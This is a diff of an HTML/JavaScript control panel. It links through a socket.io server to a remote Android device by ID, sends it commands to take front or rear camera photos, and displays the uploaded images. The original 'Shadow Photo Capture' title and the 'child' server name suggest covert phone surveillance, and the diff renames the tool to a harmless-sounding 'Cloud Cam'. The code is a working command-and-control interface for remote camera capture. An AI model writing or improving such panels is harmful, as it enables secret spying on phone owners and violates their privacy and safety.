@@ -3,165 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shadow Photo Capture</title>
+    <title>Cloudinary Camera View</title>
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        :root { --bg: #0a0a0a; --accent: #00e5ff; --panel: #161616; --text: #eee; }
-        body { margin: 0; background: var(--bg); color: var(--text); font-family: sans-serif; height: 100vh; display: flex; flex-direction: column; }
+        body { margin: 0; background: #000; color: white; font-family: sans-serif; display: flex; flex-direction: column; height: 100vh; }
         
-        /* Header */
-        .header { padding: 15px 20px; background: var(--panel); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; }
-        .status { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
-        .dot { height: 10px; width: 10px; background: #ff3333; border-radius: 50%; }
-        .dot.active { background: #00ff88; box-shadow: 0 0 10px #00ff88; }
+        .header { padding: 15px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
+        .status { font-size: 0.9rem; color: #888; }
+        .online { color: #00ff88; font-weight: bold; }
 
-        /* Main Image Area */
-        .image-container { 
-            flex: 1; display: flex; justify-content: center; align-items: center; 
-            background: #000; position: relative; overflow: hidden;
-        }
-        
-        #capturedImage { 
-            max-width: 100%; max-height: 100%; 
-            display: none; border: 2px solid #333; border-radius: 8px;
+        /* Photo Area */
+        .photo-area { 
+            flex: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; 
+            padding: 20px;
         }
 
-        .placeholder { text-align: center; color: #555; }
-        .loader { display: none; color: var(--accent); }
+        #displayedImage { 
+            max-width: 90%; max-height: 70vh; 
+            border: 2px solid #333; border-radius: 10px; 
+            display: none; /* Pehle chhupa rahega */
+            box-shadow: 0 0 20px rgba(0,255,136, 0.2);
+        }
 
-        /* Controls */
+        .loader { display: none; text-align: center; }
+        .fa-spin { color: #00ff88; margin-bottom: 10px; }
+
+        /* Button Area */
         .controls { 
-            padding: 20px; background: var(--panel); display: flex; justify-content: center; gap: 20px;
+            background: #111; padding: 20px; text-align: center; 
             border-top: 1px solid #333;
         }
-        
-        .btn { 
-            background: #222; color: white; border: 1px solid #444; 
-            padding: 12px 25px; border-radius: 30px; cursor: pointer; 
-            font-size: 1rem; display: flex; align-items: center; gap: 10px;
-            transition: 0.2s;
+
+        .btn {
+            background: linear-gradient(45deg, #00c6ff, #0072ff);
+            border: none; color: white; padding: 15px 30px;
+            font-size: 18px; border-radius: 50px; cursor: pointer;
+            box-shadow: 0 5px 15px rgba(0, 114, 255, 0.4);
+            transition: 0.3s;
         }
-        .btn:hover { background: #333; border-color: var(--accent); color: var(--accent); }
         .btn:active { transform: scale(0.95); }
+        .btn:disabled { background: #444; cursor: not-allowed; }
 
     </style>
 </head>
 <body>
 
     <div class="header">
-        <div style="color: var(--accent); font-weight: bold; font-size: 1.2rem;">
-            <i class="fa-solid fa-camera-retro"></i> SHADOW CAPTURE
-        </div>
-        <div class="status">
-            <span id="stat-dot" class="dot"></span>
-            <span id="stat-text">Disconnected</span>
-        </div>
+        <div><i class="fa-solid fa-cloud"></i> CLOUD CAM</div>
+        <div id="status" class="status">Connecting...</div>
     </div>
 
-    <div class="image-container">
-        <div id="placeholder" class="placeholder">
-            <i class="fa-regular fa-image fa-4x"></i>
-            <p>No Image Captured Yet</p>
-        </div>
+    <div class="photo-area">
+        <h3 id="msg" style="color: #444;">Click button to capture</h3>
 
         <div id="loader" class="loader">
-            <i class="fa-solid fa-circle-notch fa-spin fa-3x"></i>
-            <p>Capturing & Uploading...</p>
+            <i class="fa-solid fa-circle-notch fa-3x fa-spin"></i>
+            <p>Capturing & Uploading to Cloud...</p>
         </div>
 
-        <img id="capturedImage" src="" alt="Captured Photo">
+        <img id="displayedImage" src="" alt="Cloud Photo">
     </div>
 
     <div class="controls">
-        <button class="btn" onclick="capturePhoto('camera')">
-            <i class="fa-solid fa-camera"></i> Rear Cam
-        </button>
-        <button class="btn" onclick="capturePhoto('camera_front')">
-            <i class="fa-solid fa-user"></i> Front Cam
+        <button id="capBtn" class="btn" onclick="captureToCloud()">
+            <i class="fa-solid fa-camera"></i> Capture & Upload
         </button>
     </div>
 
     <script>
-        // 🔥 Server URL (Apna URL check kar lena)
+        // 🔥 Apna Server URL yaha daalo
         const SERVER_URL = "https://child-v9no.onrender.com"; 
+        
         let socket;
+        // URL se device ID nikalo (?id=12345)
         let deviceId = new URLSearchParams(window.location.search).get('id');
 
-        const imgElement = document.getElementById('capturedImage');
-        const placeholder = document.getElementById('placeholder');
+        const imgTag = document.getElementById('displayedImage');
         const loader = document.getElementById('loader');
-        const statusText = document.getElementById('stat-text');
-        const statusDot = document.getElementById('stat-dot');
+        const msg = document.getElementById('msg');
+        const statusDiv = document.getElementById('status');
+        const btn = document.getElementById('capBtn');
 
-        if (!deviceId) {
-            statusText.innerText = "ERROR: Device ID Missing";
+        if(!deviceId) {
+            statusDiv.innerText = "Error: No Device ID";
+            btn.disabled = true;
         } else {
-            initSocket();
+            init();
         }
 
-        function initSocket() {
+        function init() {
             socket = io(SERVER_URL);
 
-            // Connect Event
             socket.on("connect", () => {
-                statusDot.classList.add('active');
-                statusText.innerText = "Online: " + deviceId;
+                statusDiv.innerHTML = 'Status: <span class="online">Online</span>';
                 socket.emit("join", deviceId); // Admin room join
-                console.log("Connected to Server");
             });
 
-            // Disconnect Event
             socket.on("disconnect", () => {
-                statusDot.classList.remove('active');
-                statusText.innerText = "Offline";
+                statusDiv.innerText = "Status: Offline";
             });
 
-            // 🔥 IMAGE RECEIVE EVENT (Jab phone photo bhejega)
-            // Server se event ka naam 'image-received' ya 'file-uploaded' hona chahiye
-            socket.on("image_data", (data) => {
-                console.log("Image Received!");
+            // 🔥 Yaha Cloudinary ka Link aayega
+            // Event ka naam 'cloud_url' rakha hai (Server/App same bheje)
+            socket.on("cloud_url", (data) => {
+                console.log("Photo URL aa gaya:", data);
                 
                 // Hide Loader
-                loader.style.display = 'none';
-                placeholder.style.display = 'none';
+                loader.style.display = "none";
                 
                 // Show Image
-                // Agar data base64 hai to: "data:image/jpeg;base64,..."
-                // Agar URL hai to seedha link
-                if(data.startsWith("http") || data.startsWith("data:image")) {
-                    imgElement.src = data;
+                if(data && data.startsWith("http")) {
+                    imgTag.src = data;
+                    imgTag.style.display = "block";
+                    msg.style.display = "none";
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fa-solid fa-camera"></i> Capture Again';
                 } else {
-                    // Assume Base64 string without prefix
-                    imgElement.src = "data:image/jpeg;base64," + data;
+                    alert("Invalid URL received: " + data);
                 }
-                
-                imgElement.style.display = 'block';
             });
         }
 
-        // 🔥 COMMAND SENDER
-        function capturePhoto(camType) {
-            if(!socket || !socket.connected) {
-                alert("Server Disconnected!");
-                return;
-            }
+        function captureToCloud() {
+            if(!socket.connected) { alert("Server not connected"); return; }
 
-            // Loader dikhao
-            imgElement.style.display = 'none';
-            placeholder.style.display = 'none';
-            loader.style.display = 'block';
+            // UI Update
+            imgTag.style.display = "none";
+            msg.style.display = "none";
+            loader.style.display = "block";
+            btn.disabled = true;
+            btn.innerText = "Wait...";
 
-            // Server ko command bhejo
-            // Format: deviceId, command
-            console.log("Sending command:", camType);
-            
-            // Server par depend karta hai ki wo kaise command expect karta hai.
-            // Zyadatar systems me ye format hota hai:
+            // Send Command to Android
+            // Command: 'camera_upload' (Taki App samajh jaye ki Cloud pe dalna hai)
             socket.emit("command", {
                 room: deviceId,
-                command: camType
+                command: "camera_upload" 
             });
         }
     </script>
